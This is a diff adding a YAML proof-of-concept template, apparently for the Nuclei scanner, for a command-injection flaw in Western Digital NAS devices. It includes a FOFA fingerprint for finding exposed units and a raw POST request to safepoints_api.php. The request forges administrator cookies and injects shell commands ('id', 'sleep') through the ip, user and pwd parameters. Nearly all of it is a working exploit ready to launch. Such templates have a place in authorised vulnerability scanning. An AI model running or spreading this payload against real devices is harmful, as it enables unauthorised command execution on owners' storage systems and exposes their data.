@@ -1,0 +1,36 @@
+id: poc-ho4evp8k9un8hvho
+info:
+  name: 西部数据 NAS safepoints_api.php network_get_sharefolder 命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ho4evp8k9un8hvho'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ho4evp8k9un8hvho
+    fofa: icon_hash="-1074357885"
+http:
+- raw:
+  - 'POST /web/addons/safepoints_api.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+    Connection: keep-alive
+
+    Content-Length: 68
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: isAdmin=1; username=admin;
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    action=network_get_sharefolder&ip='';id;''&user='';sleep 1;''&pwd='';id;'''
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
